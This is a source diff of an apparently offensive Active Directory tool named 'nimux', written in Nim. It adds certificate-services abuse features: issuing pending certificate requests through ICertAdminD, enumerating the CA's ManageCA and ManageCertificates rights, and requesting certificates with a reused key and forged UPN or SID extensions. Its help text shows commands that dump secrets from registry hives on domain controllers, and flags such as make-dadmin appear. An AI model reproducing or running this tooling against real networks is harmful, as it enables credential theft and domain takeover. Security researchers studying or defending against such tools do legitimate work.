+    KRB5CCNAME=<ccache> nimux secrets dc01.example.local -k -u <admin> -d EXAMPLE --backup-hives --remote 'C:\Windows\Temp' --json
+    nimux secrets LOCAL --sam SAM.save --security SECURITY.save --system SYSTEM.save -d example.local
 
   Output
     nimux scan 10.0.0.0/24 --json > scan.jsonl
-    nimux smb dc01 -u alice -p Pass --shares --json
+    nimux smb dc01 -u operator -p '<password>' --shares --json
 """)
 
 proc parsePortSpec(value: string): seq[int] =
@@ -2201,6 +2213,7 @@ proc parseCli(): CliConfig =
     "add-computer", "computer", "computer-pass", "computer-ou", "ou",
     "computer-dns", "delegate-from", "delegate-to", "restore-to", "new-name", "move-to",
     "bloodhound-out", "ca", "template", "out", "pfx", "upn", "dns-name",
+    "adcs-issue", "request-id",
     "adcs-set-editflags", "adcs-set-disable-extension-list",
     "blob-out", "key", "ccache", "krb5-config", "krb5-conf", "zone", "record", "type", "data", "ttl",
     "database", "ole", "clr", "xp-link", "ole-link", "clr-link", "query-file", "link-chain",
@@ -2268,7 +2281,7 @@ proc parseCli(): CliConfig =
       "remove-ace", "delete-user", "delete-computer", "delete-group", "delete",
       "ldif", "nested-groups", "acl", "include-deleted", "gpo", "add", "laps-schema",
       "deny", "allow", "exact", "ls", "no-bump", "dry-run", "adcs", "startup", "schtask", "create-gpo", "delegate",
-      "adcs-request", "adcs-auth", "adcs-rpc", "adcs-policy", "adcs-get-editflags", "adcs-get-disable-extension-list", "cert-inventory", "cert-map", "remove-map", "opsec-notes", "decrypt-mslaps",
+      "adcs-request", "adcs-auth", "adcs-rpc", "adcs-policy", "adcs-get-ca-security", "adcs-get-editflags", "adcs-get-disable-extension-list", "cert-inventory", "cert-map", "remove-map", "opsec-notes", "decrypt-mslaps",
       "get-gmsa", "dns-add", "dns-delete", "dns-replace", "adcs-template", "server",
       "add-member", "remove-member", "restore-deleted", "move", "bloodhound", "legacy", "recursive", "full", "trust-keys",
       "lockout-aware", "schannel", "reverse", "linux",
@@ -2827,6 +2840,8 @@ proc parseCli(): CliConfig =
         result.ldapGpoTarget = value
       of "target-dn":
         result.ldapBadSuccessorTarget = value
+        if result.ldapModifyDn.len == 0:
+          result.ldapModifyDn = value
       of "make-dadmin":
         result.ldapMakeDadmin = true
       of "make-kerberoast":
@@ -2901,6 +2916,8 @@ proc parseCli(): CliConfig =
         result.ldapAdcsAuth = true
       of "adcs-policy":
         result.ldapAdcsPolicySet = true
+      of "adcs-issue":
+        result.ldapAdcsIssue = value
       of "ca":
         if result.protocol == "krb5conf" or fileExists(value):
           result.krb5CaPath = value
@@ -2908,6 +2925,11 @@ proc parseCli(): CliConfig =
           result.ldapAdcsCa = value
       of "template":
         result.ldapAdcsTemplate = value
+      of "request-id":
+        try:
+          result.ldapAdcsRequestId = uint32(parseBiggestUInt(value))
+        except CatchableError:
+          result.ldapAdcsRequestId = 0'u32
       of "out":
         if result.protocol in ["krb5conf", "kerberos"]:
           result.krb5Out = value
@@ -2970,6 +2992,9 @@ proc parseCli(): CliConfig =
       of "adcs-get-editflags":
         result.ldapAdcsPolicySet = true
         result.ldapAdcsGetEditFlags = true
+      of "adcs-get-ca-security":
+        result.ldapAdcsPolicySet = true
+        result.ldapAdcsGetCaSecurity = true
       of "adcs-get-disable-extension-list":
         result.ldapAdcsPolicySet = true
         result.ldapAdcsGetDisableExtensionList = true
@@ -3927,6 +3952,7 @@ proc smbProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
       if session.ctx != nil and session.ipcTreeId != 0:
         let extras = await smbclient.enumerateSmbExtras(session.ctx,
           smbclient.SmbPipeInfo(), false, smbRequests(config))
+        probe.shares = extras.shares
         probe.sessions = extras.sessions
         probe.disks = extras.disks
         probe.loggedOnUsers = extras.loggedOnUsers
@@ -5482,7 +5508,22 @@ proc splitAttrValue(text: string): tuple[attr, value: string] =
   let pos = text.find('=')
   if pos < 1:
     raise newException(ValueError, "attribute assignment expects attr=value: " & text)
-  (text[0 ..< pos].strip(), text[pos + 1 .. ^1])
+  let attr = text[0 ..< pos].strip()
+  let rawValue = text[pos + 1 .. ^1]
+  let lowerValue = rawValue.toLowerAscii()
+  if lowerValue.startsWith("hex:"):
+    let hex = rawValue[4 .. ^1].replace(" ", "").replace(":", "")
+    if hex.len mod 2 != 0:
+      raise newException(ValueError, "hex attribute value must have an even number of digits: " & attr)
+    var decoded = ""
+    var i = 0
+    while i < hex.len:
+      decoded.add char(parseHexInt(hex[i .. i + 1]))
+      inc i, 2
+    return (attr, decoded)
+  if lowerValue.startsWith("base64:"):
+    return (attr, base64.decode(rawValue[7 .. ^1]))
+  (attr, rawValue)
 
 proc attrsFromAssignments(items: seq[string]): seq[tuple[name: string, values: seq[string]]] =
   for item in items:
@@ -5499,7 +5540,14 @@ proc attrsFromAssignments(items: seq[string]): seq[tuple[name: string, values: s
 proc modsFromAssignments(items: seq[string]; op: ldapclient.LdapModOp): seq[ldapclient.LdapModification] =
   for item in items:
     let av = splitAttrValue(item)
-    result.add ldapclient.LdapModification(op: op, attr: av.attr, values: @[av.value])
+    var found = false
+    for entry in result.mitems:
+      if entry.attr.toLowerAscii() == av.attr.toLowerAscii() and entry.op == op:
+        entry.values.add av.value
+        found = true
+        break
+    if not found:
+      result.add ldapclient.LdapModification(op: op, attr: av.attr, values: @[av.value])
 
 proc computerPartsCli(name: string): tuple[cn, sam: string] =
   var clean = name.strip()
@@ -6673,10 +6721,11 @@ proc wrapCsrPkcs7(csrDer, certFile, keyFile: string): string =
     copyMem(addr result[0], derBuf, derLen)
     OPENSSL_free(derBuf)
 
-proc adcsBuildIcprStub(authority, attributes, requestDer: string; dwFlags: uint32 = 0'u32): string =
+proc adcsBuildIcprStub(authority, attributes, requestDer: string; dwFlags: uint32 = 0'u32;
+                       requestId: uint32 = 0'u32): string =
   result.adcsAddU32Le dwFlags
   result.add adcsBuildUniqueWString(authority, 0x00020000'u32)
-  result.adcsAddU32Le 0'u32
+  result.adcsAddU32Le requestId
   let attrsUtf = if attributes.len > 0: smbclient.toUtf16Le(attributes) & "\x00\x00" else: ""
   result.add adcsBuildCertTransBlob(attrsUtf, 0x00020004'u32)
   result.add adcsBuildCertTransBlob(requestDer, 0x00020008'u32)
@@ -6702,18 +6751,26 @@ proc adcsParseCertTransBlob(stub: string; offset: var int): string =
     inc offset
 
 proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
-  if config.ldapAdcsCa.len == 0 or config.ldapAdcsTemplate.len == 0:
+  if config.ldapAdcsCa.len == 0 or
+      (config.ldapAdcsTemplate.len == 0 and config.ldapAdcsRequestId == 0'u32):
     return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
       "host": host, "success": false,
-      "message": "--adcs-request requires --ca and --template"}
-  let csr = generateAdcsCsr(config, includeRequestExtensions = false)
-  if not csr.ok:
-    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
-      "host": host, "success": false, "message": "CSR generation failed",
-      "output": csr.output}
-  var requestDer = csr.csrDer
+      "message": "--adcs-request requires --ca and --template, or --ca with --request-id"}
+  var csr: tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string]
+  var requestDer = ""
+  if config.ldapAdcsRequestId == 0'u32:
+    let needsRequestExtensions = config.ldapAdcsUpn.len > 0 or
+      config.ldapAdcsDns.len > 0 or config.ldapAdcsSid.len > 0
+    csr = generateAdcsCsr(config, includeRequestExtensions = needsRequestExtensions)
+    if not csr.ok:
+      return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
+        "host": host, "success": false, "message": "CSR generation failed",
+        "output": csr.output}
+    requestDer = csr.csrDer
   var requestFlags = 0'u32
-  var attrib = "CertificateTemplate:" & config.ldapAdcsTemplate
+  var attrib =
+    if config.ldapAdcsRequestId == 0'u32: "CertificateTemplate:" & config.ldapAdcsTemplate
+    else: ""
   var sanParts: seq[string] = @[]
   if config.ldapAdcsUpn.len > 0:
     sanParts.add "upn=" & config.ldapAdcsUpn
@@ -6757,7 +6814,8 @@ proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {
       "message": "could not open \\\\PIPE\\\\cert", "status": "0x" & pipe.status.toHex(8)}
   var bindOk = false
   var callRes: smbclient.DceRpcCallResult
-  let icprStub = adcsBuildIcprStub(caAuthority, attrib, requestDer, requestFlags)
+  let icprStub = adcsBuildIcprStub(caAuthority, attrib, requestDer, requestFlags,
+    config.ldapAdcsRequestId)
   if config.kerberos:
     let bound = await session.ctx.rpcBindPipeKerb(pipe, @ICertPassageUuid, 0'u16, 0'u16,
       host, config.domain, ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
@@ -6805,7 +6863,13 @@ proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {
         config.ldapAdcsOut
       else:
         artifactPrefix & ".pfx"
-    pfxOk = writePkcs12FromPemFiles(certPath, csr.keyPath, pfxPath, "")
+    let keyPath =
+      if config.ldapAdcsRequestId != 0'u32 and config.ldapAdcsKey.len > 0:
+        config.ldapAdcsKey
+      else:
+        csr.keyPath
+    if keyPath.len > 0:
+      pfxOk = writePkcs12FromPemFiles(certPath, keyPath, pfxPath, "")
     let caDer = await fetchAdcsCaDer(host, if config.port > 0: config.port else: 389,
       max(config.timeoutMs, 5000), config.username, config.password,
       config.domain, config.ntlmHash, caAuthority, config.kerberos)
@@ -6819,7 +6883,8 @@ proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {
     "disposition": "0x" & disposition.toHex(8), "ca": config.ldapAdcsCa,
     "authority": caAuthority, "request_flags": "0x" & requestFlags.toHex(8),
     "template": config.ldapAdcsTemplate, "on_behalf_of": config.ldapAdcsOnBehalfOf,
-    "key": csr.keyPath, "csr": csr.csrPath,
+    "key": if config.ldapAdcsRequestId != 0'u32: config.ldapAdcsKey else: csr.keyPath,
+    "csr": if config.ldapAdcsRequestId != 0'u32: "" else: csr.csrPath,
     "cert": certPath, "pfx": if pfxOk: pfxPath else: "", "ca_pem": caPemPath,
     "cert_chain_len": certChain.len, "cert_len": encodedCert.len,
     "message": if dispText.len > 0: dispText
@@ -6867,10 +6932,11 @@ proc sidStringToBinary(sid: string): string =
     result.adcsAddU32Le uint32(sub)
 
 proc buildNtdsSidSecurityExtValue(sid: string): string =
-  let sidBytes = sidStringToBinary(sid)
-  let objectSidOid = "\x06\x0b\x2b\x06\x01\x04\x01\x82\x37\x19\x02\x01"
-  let octets = derTlv(0x04'u8, sidBytes)
-  result = derTlv(0x30'u8, objectSidOid & octets)
+  discard sidStringToBinary(sid)
+  let objectSidOid = "\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x19\x02\x01"
+  let sidOctets = derTlv(0x04'u8, sid)
+  let sidValue = derTlv(0xa0'u8, sidOctets)
+  result = derTlv(0x30'u8, derTlv(0xa0'u8, objectSidOid & sidValue))
 
 proc makeNtdsSidSecurityExtension(sid: string): ptr X509ExtObj =
   let value = buildNtdsSidSecurityExtValue(sid)
@@ -7294,11 +7360,12 @@ proc ldapAdcsPolicySetJson(host: string; config: CliConfig): Future[JsonNode] {.
       "success": false, "message": "--adcs-policy requires --ca <name>"}
   if not config.ldapAdcsGetEditFlags and
       not config.ldapAdcsGetDisableExtensionList and
+      not config.ldapAdcsGetCaSecurity and
       config.ldapAdcsSetEditFlags.len == 0 and
       not config.ldapAdcsSetDisableExtensionListPresent:
     return %*{"protocol": "ldap", "operation": "adcs-policy", "host": host,
       "success": false,
-      "message": "set --adcs-get-editflags, --adcs-get-disable-extension-list, --adcs-set-editflags, or --adcs-set-disable-extension-list"}
+      "message": "set --adcs-get-ca-security, --adcs-get-editflags, --adcs-get-disable-extension-list, --adcs-set-editflags, or --adcs-set-disable-extension-list"}
   let credential = smbclient.SmbCredential(
     username: config.username, password: config.password,
     ntlmHash: config.ntlmHash, domain: config.domain,
@@ -7309,6 +7376,45 @@ proc ldapAdcsPolicySetJson(host: string; config: CliConfig): Future[JsonNode] {.
   let caAuthority = certAdminAuthorityString(config.ldapAdcsCa)
   var updates = newJArray()
   var success = true
+  if config.ldapAdcsGetCaSecurity:
+    let sec = await certadminclient.getCASecurity(
+      host, max(config.timeoutMs, 8000), credential, authMethod, caAuthority)
+    if not sec.success:
+      success = false
+      updates.add %*{"value": "CASecurity", "operation": "get",
+        "transport": sec.transport,
+        "hresult": "0x" & sec.hresult.toHex(8),
+        "fault_status": "0x" & sec.faultStatus.toHex(8),
+        "message": sec.message}
+    else:
+      let parsed = ldapclient.parseSecurityDescriptor(sec.securityDescriptor)
+      var aces = newJArray()
+      for ace in parsed.aces:
+        var caRights = newJArray()
+        if (ace.mask and 0x00000001'u32) != 0: caRights.add %"ManageCA"
+        if (ace.mask and 0x00000002'u32) != 0: caRights.add %"ManageCertificates"
+        if (ace.mask and 0x00000004'u32) != 0: caRights.add %"Auditor"
+        if (ace.mask and 0x00000008'u32) != 0: caRights.add %"Operator"
+        if (ace.mask and 0x00000100'u32) != 0: caRights.add %"Read"
+        if (ace.mask and 0x00000200'u32) != 0: caRights.add %"Enroll"
+        aces.add %*{
+          "ace_type": ace.aceType,
+          "ace_flags": ace.aceFlags,
+          "mask": "0x" & ace.mask.toHex(8),
+          "trustee_sid": ace.trusteeSid,
+          "ca_rights": caRights,
+          "object_type": ace.objectType,
+          "inherited_object_type": ace.inheritedObjectType
+        }
+      updates.add %*{"value": "CASecurity", "operation": "get",
+        "transport": sec.transport,
+        "hresult": "0x" & sec.hresult.toHex(8),
+        "fault_status": "0x" & sec.faultStatus.toHex(8),
+        "owner_sid": parsed.owner,
+        "group_sid": parsed.group,
+        "ace_count": parsed.aces.len,
+        "aces": aces,
+        "message": sec.message}
   if config.ldapAdcsGetEditFlags:
     let getResult = await certadminclient.getConfigEntryI4(
       host, max(config.timeoutMs, 8000), credential, authMethod,
@@ -7463,6 +7569,38 @@ proc ldapAdcsPolicySetJson(host: string; config: CliConfig): Future[JsonNode] {.
     "updates": updates,
     "message": if success: "ADCS policy values verified via ICertAdminD2"
       else: "one or more ICertAdminD2 policy operations failed verification"}
+
+proc ldapAdcsIssueJson(host: string; config: CliConfig): Future[JsonNode] {.async.} =
+  if config.ldapAdcsCa.len == 0 or config.ldapAdcsIssue.len == 0:
+    return %*{"protocol": "ldap", "operation": "adcs-issue", "host": host,
+      "success": false, "message": "--adcs-issue requires --ca <name> and a request id"}
+  var requestId = 0'u32
+  try:
+    requestId = uint32(parseBiggestUInt(config.ldapAdcsIssue))
+  except CatchableError:
+    return %*{"protocol": "ldap", "operation": "adcs-issue", "host": host,
+      "success": false, "message": "invalid request id"}
+  if requestId == 0'u32:
+    return %*{"protocol": "ldap", "operation": "adcs-issue", "host": host,
+      "success": false, "message": "request id must be nonzero"}
+
+  let caAuthority = certAdminAuthorityString(config.ldapAdcsCa)
+  let credential = smbclient.SmbCredential(
+    username: config.username, password: config.password,
+    ntlmHash: config.ntlmHash, domain: config.domain,
+    ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
+  let authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
+  let r = await certadminclient.resubmitRequest(
+    host, max(config.timeoutMs, 8000), credential, authMethod,
+    caAuthority, requestId)
+  return %*{"protocol": "ldap", "operation": "adcs-issue", "host": host,
+    "success": r.success, "ca": config.ldapAdcsCa, "authority": caAuthority,
+    "request_id": requestId, "disposition": "0x" & r.disposition.toHex(8),
+    "hresult": "0x" & r.hresult.toHex(8),
+    "fault_status": "0x" & r.faultStatus.toHex(8),
+    "transport": r.transport, "interface": "ICertAdminD",
+    "opnum": certadminclient.OpResubmitRequest,
+    "message": r.message}
 
 proc ldapAdcsAuthJson(host: string; config: CliConfig): JsonNode =
   var principal =
@@ -9739,6 +9877,8 @@ proc ldapProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
     return await ldapDnsRecordJson(host, config)
   if config.ldapAdcsPolicySet:
     return await ldapAdcsPolicySetJson(host, config)
+  if config.ldapAdcsIssue.len > 0:
+    return await ldapAdcsIssueJson(host, config)
   if config.ldapAdcsRequest:
     return await ldapAdcsRequestJson(host, config)
   if config.ldapAdcsAuth:
@@ -11774,7 +11914,7 @@ proc smbLsProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} 
   let credential = smbclient.SmbCredential(
     username: config.username, password: config.password,
     ntlmHash: config.ntlmHash, domain: config.domain,
-    ccache: config.ccachePath)
+    ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
   let session = await smbclient.establishSmbSession(host, config.port,
     max(config.timeoutMs, 5000), credential,
     if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm)
@@ -12280,7 +12420,7 @@ proc smbMkdirProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async
     config.username, config.password, config.ntlmHash, config.domain,
     config.shareName, config.remotePath,
     authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm,
-    ccache = config.ccachePath)
+    ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
   return xferToJson(r, "mkdir")
 
 proc protocolProbeOne(host: string; config: CliConfig): Future[JsonNode] {.async.} =
